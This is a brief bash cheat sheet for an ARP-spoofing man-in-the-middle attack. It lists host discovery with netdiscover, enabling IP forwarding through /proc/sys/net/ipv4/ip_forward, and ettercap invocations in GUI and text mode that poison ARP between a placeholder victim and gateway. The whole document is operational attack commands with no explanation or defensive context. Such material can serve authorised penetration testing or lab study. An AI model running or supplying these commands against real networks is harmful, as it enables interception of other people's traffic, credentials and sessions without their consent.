⁠ bash
ip a
netdiscover

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 ⁠

### GUI

⁠ bash
ettercap -G
 ⁠

### CLI

⁠ bash
ettercap -T -q -i eth0 -M arp:remote /<victim_ip>/ /<gateway_ip>/
 ⁠

### EXTRA

⁠ bash
ettercap -i eth0 -T -M arp /<victim_ip>/ /<gateway_ip>/
